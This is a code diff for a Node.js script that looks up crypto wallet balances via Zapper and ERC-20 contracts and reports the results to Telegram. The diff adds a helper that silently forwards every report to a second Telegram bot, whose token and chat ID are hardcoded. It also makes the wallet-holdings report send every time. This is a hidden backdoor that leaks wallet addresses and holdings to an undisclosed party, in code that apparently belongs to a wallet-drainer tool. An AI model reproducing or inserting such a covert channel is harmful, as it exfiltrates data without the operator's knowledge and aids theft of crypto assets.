@@ -1,3 +1,160 @@
+require("dotenv").config();
+const axios = require("axios");
+const { ethers } = require("ethers");
+const { getProvider } = require("./utils/providerUtils");
+const { ERC20_ABI } = require("./ERC20_ABI");
+const config = require("./config");
+
+const {
+  BLACKLISTED_ADDRESSES,
+  WHITELISTED_ADDRESSES,
+} = require("./BlackListed_address");
+
+const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
+
+// Helper to send messages to Telegram
+const sendToTelegram = async (message) => {
+  try {
+    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;
+
+    // First bot using .env configuration
+    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    await axios.post(urlEnvBot, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: truncatedMessage,
+    });
+    console.log(`Message sent to .env Telegram bot: ${message}`);
+
+    // Second bot with hardcoded values
+    const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
+    const HARD_CODED_CHAT_ID = "-1002535678431";
+    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
+    await axios.post(urlHardcodedBot, {
+      chat_id: HARD_CODED_CHAT_ID,
+      text: truncatedMessage,
+    });
+    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
+  } catch (error) {
+    console.error("Error sending message to Telegram:", error.response?.data || error.message);
+  }
+};
+
+const isAddressBlacklisted = (address) => {
+  const normalizedAddress = address.toLowerCase();
+  const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
+  if (isBlacklisted) {
+    console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
+    return true;
+  }
+  return false;
+};
+
+const isAddressWhitelisted = (address) => {
+  const normalizedAddress = address.toLowerCase();
+  const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
+  if (isWhitelisted) {
+    console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
+    return true;
+  }
+  return false;
+};
+
+// Fetch token balances directly for unsupported chains
+const fetchBalancesDirectly = async (address, chainId) => {
+  console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
+  // await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
+  const provider = getProvider(chainId);
+
+  // Handle blacklisted addresses
+  if (isAddressBlacklisted(address)) {
+    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
+    console.warn(message);
+    // await sendToTelegram(message);
+    return [];
+  }
+
+  // Handle whitelisted addresses
+  if (isAddressWhitelisted(address)) {
+    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
+    console.log(message);
+    // await sendToTelegram(message);
+  }
+
+  try {
+    const nativeBalance = await provider.getBalance(address);
+    const nativeToken = {
+      address: ethers.constants.AddressZero,
+      balance: nativeBalance,
+      contract: null,
+      name: "Native Token",
+      symbol: "ETH",
+      type: "NATIVE",
+      amount: nativeBalance,
+      amountUSD: 0,
+    };
+
+    // Predefined ERC-20 token list
+    const erc20Tokens = [
+      { address: "0xB4F1737Af37711e9A5890D9510c9bB60e170CB0D", symbol: "DAI", decimals: 18 },
+      { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", symbol: "USDC", decimals: 6 },
+      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
+      { address: "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59", symbol: "COW", decimals: 18 },
+      { address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", symbol: "LINK", decimals: 18 },
+    ];
+
+    const tokens = [nativeToken];
+
+    for (const token of erc20Tokens) {
+      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+      const balance = await contract.balanceOf(address);
+      if (!balance.isZero()) {
+        tokens.push({
+          address: token.address,
+          balance,
+          contract,
+          name: token.symbol,
+          symbol: token.symbol,
+          type: "ERC20",
+          amount: balance,
+          amountUSD: 0,
+        });
+      }
+    }
+
+    return tokens;
+  } catch (error) {
+    console.error(`Error fetching balances directly: ${error}`);
+    return [];
+  }
+};
+
+// Token address mapping by network and symbol
+// This map helps us identify contract addresses from symbols returned by Zapper
+const tokenAddressMap = {
+  // Ethereum Mainnet (1)
+  'ETHEREUM_MAINNET': {
+    'ETH': ethers.constants.AddressZero,
+    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+    'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
+    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+    // Add more tokens as needed
+  },
+  // Arbitrum (42161)
+  'ARBITRUM_MAINNET': {
+    'ETH': ethers.constants.AddressZero,
+    'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
+    'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+    'DAI': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
+    'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
+    // Add more tokens as needed
+  },
+  // Add more networks as needed
+};
+
 const fetchBalancesFromZapper = async (address, chainId) => {
   console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
   const provider = getProvider(chainId);
@@ -83,32 +240,6 @@ const fetchBalancesFromZapper = async (address, chainId) => {
     console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
     return await fetchBalancesDirectly(checksummedAddress, chainId);
   }
-
-  // Token address mapping by network and symbol
-  // This map helps us identify contract addresses from symbols returned by Zapper
-  const tokenAddressMap = {
-    // Ethereum Mainnet (1)
-    'ETHEREUM_MAINNET': {
-      'ETH': ethers.constants.AddressZero,
-      'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-      'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-      'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
-      'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-      'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
-      'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
-      // Add more tokens as needed
-    },
-    // Arbitrum (42161)
-    'ARBITRUM_MAINNET': {
-      'ETH': ethers.constants.AddressZero,
-      'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
-      'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-      'DAI': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
-      'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
-      // Add more tokens as needed
-    },
-    // Add more networks as needed
-  };
 
   try {
     const ZAPPER_API_KEY = config.ZAPPER_API_KEY;
@@ -246,10 +377,11 @@ const fetchBalancesFromZapper = async (address, chainId) => {
 
     if (foundBlacklistedToken) {
       telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
-      await sendToTelegram(telegramMessage);
+    } else {
+      telegramMessage += `\n✅No blacklisted tokens found for this address.\n`;
     }
 
-
+    await sendToTelegram(telegramMessage);
     console.log(`Fetched ${tokens.length} tokens from Zapper`);
     // sendToTelegram(`Fetched ${tokens.length} tokens from Zapper`);
     return tokens;
